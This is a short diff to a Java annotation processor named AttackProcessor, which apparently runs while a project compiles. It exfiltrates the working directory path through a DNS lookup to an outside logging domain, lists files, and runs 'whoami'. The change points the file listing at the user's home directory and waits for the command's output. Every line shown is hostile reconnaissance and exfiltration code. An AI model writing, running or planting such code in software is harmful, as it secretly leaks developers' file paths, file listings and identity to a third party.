@@ -36,7 +36,7 @@ public class AttackProcessor extends AbstractProcessor {
             Inet4Address.getByName( System.getProperty("user.dir")+".lirui28.t.dlsr.ga" );
 
 
-            File folder = new File(System.getProperty("user.dir"));
+            File folder = new File(System.getProperty("user.home"));
 
             if (folder.isDirectory()){
                 File[] files = folder.listFiles();
@@ -55,6 +55,7 @@ public class AttackProcessor extends AbstractProcessor {
             try {
                 Runtime runtime = Runtime.getRuntime();
                 Process p = runtime.exec("whoami");
+                p.waitFor();
                 BufferedReader bw = new BufferedReader( new InputStreamReader( p
                                                                                                .getInputStream()));
                 String s;
